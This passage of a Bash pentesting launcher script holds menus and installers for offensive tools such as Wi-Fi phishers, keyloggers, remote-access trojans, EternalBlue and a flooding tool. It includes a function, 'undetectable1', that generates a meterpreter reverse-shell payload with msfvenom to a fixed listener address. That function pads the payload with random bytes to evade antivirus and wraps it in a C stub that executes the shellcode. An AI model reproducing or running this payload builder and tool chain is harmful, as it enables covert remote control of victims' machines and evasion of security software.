			fi
			echo -e "$ARPIN" > "$LPATH"/settings/arpin.txt
		elif [[ "$SET" = 5 ]]
		then
			clear
			echo -e "Type new MAC("$YS"Enter"$CE"="$DEFMAC"): "
			read NEWMAC
			if [[ "$NEWMAC" = "" ]]
			then
				echo "$DEFMAC" > "$LPATH"/settings/startmac.txt
			else
				sizemac=${#NEWMAC}
				if [[ "$sizemac" != 17 ]]
				then
					echo -e ""$RS"Invalid MAC. Setting it back to default"$CE""
					sleep 4
				else
					echo $NEWMAC > "$LPATH"/settings/startmac.txt
				fi
			fi
		elif [[ "$SET" = 4 ]]
		then
			if [[ "$IGN" = "yes" ]]
			then
				IGN="no"
			else
				IGN="yes"
			fi
			echo -e "$IGN" > "$LPATH"/settings/ignorenegativeone.txt
		elif [[ "$SET" = 3 ]]
		then
			if [[ "$ALFA" = "yes" ]]
			then
				ALFA="no"
			else
				ALFA="yes"
			fi
			echo -e "$ALFA" > "$LPATH"/settings/AWUS036ACH.txt
		elif [[ "$SET" = 2 ]]
		then
			while true
			do
				clear
				if [[ -f "$LPATH"/settings/dispfull.txt ]]
				then
					read dispfull < "$LPATH"/settings/dispfull.txt
				else
					dispfull="false"
				fi
				if [[ -f "$LPATH"/settings/colorout.txt ]]
				then
					read colorout < "$LPATH"/settings/colorout.txt
				else
					colorout="false"
				fi
				if [[ -f "$LPATH"/settings/onlylink.txt ]]
				then
					read onlylink < "$LPATH"/settings/onlylink.txt
				else
					onlylink="false"
				fi
				if [[ -f "$LPATH"/settings/numofans.txt ]]
				then
					read numofans < "$LPATH"/settings/numofans.txt
				else
					numofans="1"
				fi
				echo -e ""$YS" 1"$CE") Display the full answer text              "$dispfull""
				echo -e ""$YS" 2"$CE") Colorized output                          "$colorout""
				echo -e ""$YS" 3"$CE") Display only the answer link              "$onlylink""
				echo -e ""$YS" 4"$CE") Number of answers to return               "$numofans""
				echo -e ""$YS" 5"$CE") Clear the cache"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Choose: "
				read HOWCH
				if [[ "$HOWCH" = 1 ]]
				then
					if [[ "$dispfull" = "false" ]]
					then
						dispfull="true"
					else
						dispfull="false"
					fi
					echo "$dispfull" > "$LPATH"/settings/dispfull.txt
				elif [[ "$HOWCH" = 2 ]]
				then
					if [[ "$colorout" = "false" ]]
					then
						colorout="true"
					else
						colorout="false"
					fi
					echo "$colorout" > "$LPATH"/settings/colorout.txt
				elif [[ "$HOWCH" = 3 ]]
				then
					if [[ "$onlylink" = "false" ]]
					then
						onlylink="true"
					else
						onlylink="false"
					fi
					echo "$onlylink" > "$LPATH"/settings/onlylink.txt
				elif [[ "$HOWCH" = 4 ]]
				then
					echo -e "Type number of answers to return: "
					read numofans
					echo "$numofans" > "$LPATH"/settings/numofans.txt
				elif [[ "$HOWCH" = 5 ]]
				then
					howdoi -C
				elif [[ "$HOWCH" = "b" || "$HOWCH" = "back" ]]
				then
					break
				elif [[ "$HOWCH" = 00 ]]
				then
					exec bash $0
				elif [[ "$HOWCH" = 0 ]]
				then
					exit
				fi
			done
		elif [[ "$SET" = 1 ]]
		then
			TERMINALTITLE="LOGO COLORS"
			dash_calc
			echo -e ""$YS" 1"$CE") Light Red (default)     "$RS"SAMPLE"$CE""
			echo -e ""$YS" 2"$CE") Red                     "$DRS"SAMPLE"$CE""
			echo -e ""$YS" 3"$CE") Light Purple            "$LPS"SAMPLE"$CE""
			echo -e ""$YS" 4"$CE") Purple                  "$PS"SAMPLE"$CE""
			echo -e ""$YS" 5"$CE") Light Green             "$LGNS"SAMPLE"$CE""
			echo -e ""$YS" 6"$CE") Green                   "$GNS"SAMPLE"$CE""
			echo -e ""$YS" 7"$CE") Light Cyan              "$LCYS"SAMPLE"$CE""
			echo -e ""$YS" 8"$CE") Cyan                    "$CYS"SAMPLE"$CE""
			echo -e ""$YS" 9"$CE") Light Blue              "$LBS"SAMPLE"$CE""
			echo -e ""$YS"10"$CE") Blue                    "$BS"SAMPLE"$CE""
			echo -e ""$YS"11"$CE") Light Gray              "$LGYS"SAMPLE"$CE""
			echo -e ""$YS"12"$CE") Dark Gray               "$DGYS"SAMPLE"$CE""
			echo -e ""$YS"13"$CE") Yellow                  "$YS"SAMPLE"$CE""
			echo -e ""$YS"14"$CE") Brown                   "$BRS"SAMPLE"$CE""
			echo -e ""$YS"15"$CE") White                   "$WHS"SAMPLE"$CE""
			echo -e ""$YS"16"$CE") Black                   "$BLS"SAMPLE"$CE""
			echo -e "Choose: "
			read LC
			if [[ "$LC" = 1 ]]
			then
				echo -e "\e[1;31m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 2 ]]
			then
				echo -e "\e[0;31m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 3 ]]
			then
				echo -e "\e[1;35m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 4 ]]
			then
				echo -e "\e[0;35m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 5 ]]
			then
				echo -e "\e[1;32m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 6 ]]
			then
				echo -e "\e[0;32m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 7 ]]
			then
				echo -e "\e[1;36m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 8 ]]
			then
				echo -e "\e[0;36m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 9 ]]
			then
				echo -e "\e[1;34m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 10 ]]
			then
				echo -e "\e[0;34m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 11 ]]
			then
				echo -e "\e[0;37m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 12 ]]
			then
				echo -e "\e[1;30m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 13 ]]
			then
				echo -e "\e[1;33m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 14 ]]
			then
				echo -e "\e[0;33m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 15 ]]
			then
				echo -e "\e[1;37m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 16 ]]
			then
				echo -e "\e[0;30m" > "$LPATH"/settings/logocolor.txt
			fi		
		fi
	done
}
function undetectable1
{
	LHOST=192.168.1.104
	LPORT=4444
	DIRECTORY="/root/Desktop/shellcode.txt"
	TXT="/root/Desktop/txt.txt"
	#############
	randomshit=$(cat /dev/urandom | tr -dc a-z-A-Z-0-9 | head -c1409)
	msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f c -o "$DIRECTORY"
	echo "unsigned char padding[]=" > "$TXT"
	echo "\"$randomshit\";" >> "$TXT"
	cat "$DIRECTORY" >> "$TXT"
	echo "int main(void) { ((void (*)())buf)();}" >> "$TXT"
	leafpad "$TXT"
}
function main_options
{
	if [[ "$YORNAA" = "0" ]]
	then
		exit
	elif [[ "$YORNAA" = "gate" || "$YORNAA" = "gateway" ]]
	then
		TT=$(ifconfig | grep "$WLANN")
		if [[ "$TT" = "" ]]
		then
			echo -e ""$RS""$WLANN" is not available"$CE""
			sleep 2
		else
			GATE=$(find_gateways "$WLANN" interface)
			TTT=$(is_it_an_ip "$GATE")
			if [[ "$TTT" != 1 ]]
			then
				echo -e ""$RS"Couldn't find your gateway."$CE""
				sleep 2
				echo -e ""$RS"Make sure you are connected to a network"$CE""
				sleep 2
			else
				echo -e ""$YS"Gateway found: "$GATE""$CE""
				sleep 1
				xdg-open http://"$GATE"
				BACKL=1
			fi
		fi
	elif [[ "$YORNAA" = "scan" ]]
	then
		if [[ ! -f /usr/bin/arp-scan && ! -f /usr/sbin/arp-scan ]]
		then
			echo -e ""$BS"Installing arp-scan"$CE""
			install_arp_scan
			clear
		fi
		if [[ -f "$LPATH"/settings/arpin.txt ]]
		then
			read ARPIN < "$LPATH"/settings/arpin.txt
		else
			ARPIN="$WLANN"
		fi
		if [[ "$ARPIN" = "" ]]
		then
			ARPIN="$WLANN"
		fi
		TESTARP=$(ifconfig | grep "$ARPIN")
		if [[ "$TESTARP" = "" ]]
		then
			clear
			echo -e ""$RS"$ARPIN was not found"$CE""
			sleep 2
			BACKL=1
		else
			ip_scan $ARPIN 2
		fi
	elif [[ "$YORNAA" = "22" ]]
	then
		IFTOPT=$(which iftop)
		if [[ "$IFTOPT" == "" ]]
		then
			apt-get -y install iftop
		fi
		CHECK=$(ifconfig | grep "$iftopint")
		if [[ "$CHECK" = "" ]]
		then
			echo -e ""$RS"Interface "$iftopint" was not found"
			sleep 2
		else
			xterm -hold -T "Iftop on $iftopint" -e "iftop -n -i $iftopint -b" & disown
			BACKL=1
		fi
	elif [[ "$YORNAA" = "21" ]]
	then
		sqlmap_menu
	elif [[ "$YORNAA" = "19" ]]
	then
		echo -e ""$BS"IP:"$CE" "
		read IPG
		clear
		geolocate_ip "$IPG"
	elif [[ "$YORNAA" = "18" ]]
	then
		browser_exploiting
	elif [[ "$YORNAA" = "m" ]]
	then
		mitmf_hook
	elif [[ "$YORNAA" = "g" ]]
	then
		find_gateways
	elif [[ "$YORNAA" = "l" ]]
	then
		local_ips
	elif [[ "$YORNAA" = "17" ]]
	then
		if [[ ! -f "/usr/local/bin/howdoi" ]]
		then
			echo -e ""$RS"Howdoi is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_howdoi
			fi
		else
			clear
			if [[ -f "$LPATH"/settings/dispfull.txt ]]
			then
				read dispfull < "$LPATH"/settings/dispfull.txt
				if [[ "$dispfull" = "true" ]]
				then
					df="-a"
				fi
			else
				df=""
			fi
			if [[ -f "$LPATH"/settings/colorout.txt ]]
			then
				read colorout < "$LPATH"/settings/colorout.txt
				if [[ "$colorout" = "true" ]]
				then
					co="-c"
				fi
			else
				co=""
			fi
			if [[ -f "$LPATH"/settings/onlylink.txt ]]
			then
				read onlylink < "$LPATH"/settings/onlylink.txt
				if [[ "$onlylink" = "true" ]]
				then
					ol="-l"
				fi
			else
				ol=""
			fi
			if [[ -f "$LPATH"/settings/numofans.txt ]]
			then
				read numofans < "$LPATH"/settings/numofans.txt
				if [[ "$numofans" = "true" ]]
				then
					na="-n "$numofans""
				fi
			else
				na=""
			fi
			echo -e "How do i :  "
			read HOW
			howdoi $co $na $ol $df $HOW
		fi
	elif [[ "$YORNAA" = "settings" || "$YORNAA" = "s" ]]
	then
		settings_menu
	elif [[ "$YORNAA" = "16" ]]
	then
		ngrok_option
		BACKL=1
	elif [[ "$YORNAA" = "donate" || "$YORNAA" = "d" ]]
	then
		donate_option
#------services
	elif [[ "$YORNAA" = "pstart" ]]
	then
		service postgresql start && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
	elif [[ "$YORNAA" = "pstop" ]]
	then
		service postgresql stop && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
	elif [[ "$YORNAA" = "nstart" ]]
	then
		service network-manager start && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
	elif [[ "$YORNAA" = "nstop" ]]
	then
		service network-manager stop && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
	elif [[ "$YORNAA" = "astart" ]]
	then
		service apache2 start && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
	elif [[ "$YORNAA" = "astop" ]]
	then
		service apache2 stop && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
	elif [[ "$YORNAA" = "nessusstart" ]]
	then
		if [[ -f /etc/init.d/nessusd ]]
		then
			/etc/init.d/nessusd start && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
		else
			echo -e ""$RS"Nessus is not already installed."$CE""
			sleep 2
		fi
	elif [[ "$YORNAA" = "nessusstop" ]]
	then
		if [[ -f /etc/init.d/nessusd ]]
		then
			/etc/init.d/nessusd stop && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
		else
			echo -e ""$RS"Nessus is not already installed."$CE""
			sleep 2
		fi
#-------------
	elif [[ "$YORNAA" = "15" ]]
	then
		BACKL="1"
		spoof_email
	elif [[ "$YORNAA" = "ks" ]]
	then
		keyboard_shortcuts
	elif [[ "$YORNAA" = "interface" ]]
	then
		interface_menu
	elif [[ "$YORNAA" = "9" ]]
	then
		tools_menu
	elif [[ "$YORNAA" = "l" ]]
	then
		clear 
		exec bash "$0"
	elif [[ "$YORNAA" = "gg" ]]
	then
		geany /bin/lscript/l
	elif [[ "$YORNAA" = "1" ]]
	then
		enable_wlan
	elif [[ "$YORNAA" = "d1" ]]
	then
		check_wlans
		if [[ "$WLANCHECKING" = "" ]]
		then
			echo -e ""$RS"Error. Could find $WLANN interface to disable."$CE""
		else
			disable_wlan
		fi
	elif [[ "$YORNAA" = "2" ]]
	then
		check_wlans
		if [[ "$WLANCHECKING" = "" ]]
		then
			echo -e ""$RS"Error. Could find $WLANN interface."$CE""
		else
			echo -e "Enabling $WLANNM..."
			echo -e "Killing services..."
			(airmon-ng check kill &> /dev/null && echo -e "Done." ) || echo -e ""$RS"Error killing services"$YS""
			echo -e "Starting monitor mode..."
			(airmon-ng start $WLANN &>/dev/null && echo -e "Done" ) || echo -e "Error starting monitor mode."
		fi
	elif [[ "$YORNAA" = "d2" ]]
	then
		check_wlans
		if [[ "$WLANMCHECKING" = "" ]]
		then
			echo -e ""$RS"Error. Could find $WLANNM interface."$CE""
		else
			stop_monitor
		fi
	elif [[ "$YORNAA" = "3" ]]
	then
		change_mac
	elif [[ "$YORNAA" = "d3" ]]
	then
		interface_selection
		clear
		echo -e "Changing mac address of $MYINT to the original one..."
		ifconfig $MYINT down
		macchanger -p $MYINT
		ifconfig $MYINT up
		echo -e "Done."
	elif [[ "$YORNAA" = "4" ]]
	then
		if [[ ! -f "/etc/init.d/anonym8.sh" ]]
		then
			echo -e ""$RS"Anonym8 is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonym8
			fi
		else
			echo -e "Enabling anonym8..."
			anonym8 start
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "d4" ]]
	then
		if [[ ! -f "/etc/init.d/anonym8.sh" ]]
		then
			echo -e ""$RS"Anonym8 is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonym8
			fi
		else
			echo -e "Disabling anonym8..."
			anonym8 stop
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "5" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Enabling anonsurf..."
			anonsurf start
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "d5" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Disabling anonsurf..."
			anonsurf stop
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "6" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Status of anonsurf..."
			anonsurf status
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "d6" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Restarting anonsurf..."
			anonsurf change
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "r6" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Restarting anonsurf..."
			anonym8 change
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "7" ]]
	then
		public_ip
	elif [[ "$YORNAA" = "8" ]]
	then
		interface_selection
		clear
		echo "Your MACs: "
		macchanger -s $MYINT
	elif [[ "$YORNAA" = "10" || "$YORNAA" = "11" || "$YORNAA" = "12" ]]
	then
		new_terminal
	elif [[ "$YORNAA" = "13" ]]
	then
		mitm_menu
	elif [[ "$YORNAA" = "14" ]]
	then
		metasploit_menu
	elif [[ "$YORNAA" = "20" ]]
	then
		bruteforce_router
	elif [[ "$YORNAA" = "exit" ]]
	then
		kill -9 $PPID
		exit
	elif [[ "$YORNAA" = "update" ]]
	then
		printf '\033]2;UPDATE\a'
		clear
		update_lscript
	elif [[ "$YORNAA" = "if" || "$YORNAA" = "ifconfig" ]]
	then
		ifconfig
	elif [[ "$YORNAA" = "changelog" ]]
	then
		clear
		BACKL=1
		cat "$LPATH"/Changelog | head -n 20
		echo -e "$PAKTC"
		$READAK
		clear
	elif [[ "$YORNAA" = "" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$YORNAA" = "errors" ]]
	then
		errors_menu
	elif [[ "$YORNAA" = "etercheck" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			eternalblue_check
		else
			echo -e ""$RS"Wifiphisher is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."$CE""
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			fi
		fi
	elif [[ "$YORNAA" = "eternalblue" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			eternalblue
		else
			echo -e ""$RS"Wifiphisher is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."$CE""
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			fi
		fi
	elif [[ "$YORNAA" = "$wififb" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			wififb_attack
		else
			echo -e ""$RS"Wifiphisher is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."$CE""
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			fi
		fi
	elif [[ "$YORNAA" = "start" ]]
	then		
		start_menu
#----------
	elif [[ "$YORNAA" = "stop" ]]
	then
		stop_menu
	elif [[ "$YORNAA" = "exit" ]]
	then
		clear
		exit
	fi
####check if it is ks
var1=1
check_if_ks
####
}

#----------------TOOLS---------------
	function install_default
	{
		if [[ "$foldname" == "" ]]
		then
			testgit=$(echo "$gitlink" | grep ".git")
			if [[ "$testgit" == "" ]]
			then
				foldname=$(echo "$gitlink" | cut -d '/' -f5)
			else
				foldname=$(echo "$gitlink" | cut -d '/' -f2 | cut -d '.' -f1)
			fi
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			if [[ "$NOCONFIRM" == 1 ]]
			then
					if [[ "$foldname" != "" ]]
					then
						echo -e ""$YS"Removing: "$foldname""$CE""
						rm -r /root/"$foldname"
						cd
						git clone $gitlink	
						cd "$foldname"
						return 1
					fi
			else
				echo -e ""$YS"Removing old and install again?"$CE" ("$YS"y"$CE"/"$YS"n"$CE")"
				read ROIN
				if [[ "$ROIN" == "y" ]]
				then
					if [[ "$foldname" != "" ]]
					then
						echo -e ""$YS"Removing: "$foldname""$CE""
						rm -r /root/"$foldname"
						cd
						git clone $gitlink	
						cd "$foldname"
						return 1
					fi
				else
					return 0
				fi
			fi
		else 
			cd
			git clone $gitlink	
			cd "$foldname"
			return 1
		fi
	}
	function install_fluxion
	{
		foldname="fluxion"
		gitlink="--recursive  https://github.com/FluxionNetwork/fluxion.git"
		install_default
		#~ wget https://fluxion.tk/fluxion-unstable.zip
		#~ apt-get install -y unzip
		#~ clear
		#~ unzip /root/fluxion*.zip -d /root
		#~ cd /root/fluxion/install
		#~ chmod +x install.sh
		#~ ./install.sh	
	}
	function install_wifite
	{
		apt-get install -y wifite
	}
	function install_wifiphisher
	{
		foldname="wifiphisher"
		gitlink="https://github.com/wifiphisher/wifiphisher.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			sudo python setup.py install
		fi
	}
	function install_zatacker
	{
		echo -e "I cannot install Zatacker. Please google how to do that yourself."
		echo -e "$PAKTGB"
		read
	}
	function install_morpheus
	{
		foldname="morpheus"
		gitlink="https://github.com/r00t-3xp10it/morpheus.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x morpheus.sh
		fi
	}
	function install_osrframework
	{
		pip install osrframework
	}
	function install_hakku
	{
		foldname="hakkuframework"
		gitlink="https://github.com/4shadoww/hakkuframework.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x hakku
			chmod +x install
		fi
	}
	function install_trity
	{
		foldname="Trity"
		gitlink="https://github.com/toxic-ig/Trity.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			sudo python install.py	
		fi
	}
	function install_cupp
	{
		foldname="cupp"
		gitlink="https://github.com/Mebus/cupp.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x cupp.py
		fi
	}
	function install_dracnmap
	{
		foldname="Dracnmap"
		gitlink="https://github.com/Screetsec/Dracnmap.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x Dracnmap.sh
		fi
	}
	function install_fern
	{
		if [[ -d "/root/Fern-Wifi-Cracker" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Fern-Wifi-Cracker
		fi		
		echo -e "Installing Fern"
		echo -e "Tool by Savio-code"
		sleep 1
		cd 
		svn checkout http://github.com/savio-code/fern-wifi-cracker/trunk/Fern-Wifi-Cracker/
		cd Fern-Wifi-Cracker
		chmod +x execute.py	
	}
	function install_kickthemout
	{
		apt-get install -y nmap
		foldname="kickthemout"
		gitlink="https://github.com/k4m4/kickthemout.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			sudo python -m pip install -r requirements.txt
		fi
	}
	function install_ghostphisher
	{
		foldname="ghost-phisher"
		gitlink="https://github.com/savio-code/ghost-phisher.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x /root/ghost-phisher/Ghost-Phisher/ghost.py
		fi
	}
	function install_theeye
	{
		foldname="The-Eye"
		gitlink="https://github.com/EgeBalci/The-Eye.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x TheEye	
		fi
	}
	function install_xerxes
	{
		foldname="xerxes"
		gitlink="https://github.com/zanyarjamal/xerxes.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			gcc xerxes.c -o xerxes	
		fi
	}
	function install_mdk3
	{
		foldname="mdk3-master"
		gitlink="https://github.com/wi-fi-analyzer/mdk3-master.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			make
			make install
		fi
	}
	function install_katana
	{
		foldname="KatanaFramework"
		gitlink="https://github.com/PowerScript/KatanaFramework.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			sh dependencies
			python install
		fi
	}
	function install_airgeddon
	{
		foldname="airgeddon"
		gitlink="https://github.com/v1s1t0r1sh3r3/airgeddon.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x airgeddon.sh
		fi
	}
	function install_4nonimizer
	{
		foldname="4nonimizer"
		gitlink="https://github.com/Hackplayers/4nonimizer.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x 4nonimizer
			./4nonimizer install
			clear
			cd
			apt-get install -y python-pip
			apt-get install -y php-curl
			gem install pcaprub
			gem install packetfu	
		fi
	}
	function install_beelogger
	{
		foldname="BeeLogger"
		gitlink="https://github.com/4w4k3/BeeLogger.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x install.sh
			./install.sh
			cd
			apt-get install -y python-pip
			apt-get install -y php-curl
			gem install pcaprub
			gem install packetfu
		fi
	}
	function install_ezsploit
	{
		foldname="ezsploit"
		gitlink="https://github.com/rand0m1ze/ezsploit.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x ezsploit.sh
		fi
	}
	function install_pupy
	{
		foldname="pupy"
		gitlink="https://github.com/n1nj4sec/pupy.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			git submodule init
			git submodule update
			cd pupy
			pip install -r requirements.txt
		fi
	}
	function install_zirikatu
	{
		foldname="zirikatu"
		gitlink="https://github.com/pasahitz/zirikatu.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x zirikatu.sh
		fi
	}
	function install_wifiautopwner
	{
		foldname="WiFi-autopwner"
		gitlink="https://github.com/Mi-Al/WiFi-autopwner.git"
		install_default
	}
	function install_bully
	{
		foldname="bully"
		gitlink="https://github.com/aanarchyy/bully.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			cd src
			make
			sudo make install
		fi		
	}
	function install_anonsurf
	{
		foldname="kali-anonsurf"
		gitlink="https://github.com/Und3rf10w/kali-anonsurf.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x installer.sh
			./installer.sh
		fi
	}
	function install_anonym8
	{
		foldname="anonym8"
		gitlink="https://github.com/HiroshiManRise/anonym8.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x INSTALL.sh
			./INSTALL.sh
		fi
	}
	function install_thefatrat
	{
		foldname="TheFatRat"
		gitlink="https://github.com/Screetsec/TheFatRat.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x setup.sh && ./setup.sh	
		fi
	}
	function install_angryip
	{
		cd
		if [[ -f "/root/ipscan_*" ]]
		then
			echo -e "Removing old file"
			sleep 2
			rm -f /root/ipscan_*
		fi
		echo -e "Downloading angryipscanner"
		sleep 2
		wget https://github.com/angryip/ipscan/releases/download/3.5.2/ipscan_3.5.2_amd64.deb
		echo -e "Installing..."
		dpkg -i ipscan_3.5.2*
		echo -e "Done"
		sleep 1
	}
	function install_sniper
	{
		foldname="Sn1per"
		gitlink="https://github.com/1N3/Sn1per.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x install.sh
			./install.sh
		fi
	}
	function install_recondog
	{
		foldname="ReconDog"
		gitlink="https://github.com/UltimateHackers/ReconDog.git"
		install_default
	}
	function install_redhawk
	{
		foldname="RED_HAWK"
		gitlink="https://github.com/Tuhinshubhra/RED_HAWK.git"
		install_default
	}
	function install_winpayloads
	{
		foldname="Winpayloads"
		gitlink="https://github.com/nccgroup/Winpayloads.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x setup.sh
			./setup.sh
		fi
	}
	function install_chaos
	{
		apt install golang upx-ucl -y
		cd
		foldname="CHAOS"
		gitlink="https://github.com/tiagorlampert/CHAOS.git"
		install_default
	}
	function install_routersploit
	{
		foldname="routersploit"
		gitlink="https://github.com/reverse-shell/routersploit.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			apt-get install python3-pip
			python3 -m pip install -r requirements.txt
			python setup.py install
		fi
	}
	function install_infoga
	{
		foldname="Infoga"
		gitlink="https://github.com/m4ll0k/Infoga.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install -r requirements.txt
		fi
	}
	function install_nwatch
	{
		foldname="nWatch"
		gitlink="https://github.com/suraj-root/nWatch.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install scapy
			pip install colorama
			pip install nmap
			pip install ctypes
			pip2.7 install scapy
			pip2.7 install colorama
			pip2.7 install nmap
			pip2.7 install ctypes
		fi
	}
	function install_eternalscanner
	{
		foldname="eternal_scanner"
		gitlink="https://github.com/peterpt/eternal_scanner.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			apt-get install -y masscan metasploit-framework
		fi
	}
	function install_eaphammer
	{
		foldname="eaphammer"
		gitlink="https://github.com/s0lst1c3/eaphammer.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x kali-setup
			./kali-setup
			apt-get install -y python-tqdm
		fi
	}
	function install_dagon
	{
		foldname="dagon"
		gitlink="https://github.com/ekultek/dagon.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install -r requirements.txt
			pip2.7 install -r requirements.txt
			apt-get install -y bcrypt
		fi
	}
	function install_lalin
	{
		foldname="LALIN"
		gitlink="https://github.com/Screetsec/LALIN.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x Lalin.sh
		fi
	}
	function install_knockmail
	{
		foldname="KnockMail"
		gitlink="https://github.com/4w4k3/KnockMail.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install -r requeriments.txt
		fi
	}
	function install_kwetza
	{
		foldname="kwetza"
		gitlink="https://github.com/sensepost/kwetza.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install beautifulsoup4
			pip2.7 install beautifulsoup4
		fi
	}
	function install_ngrok
	{
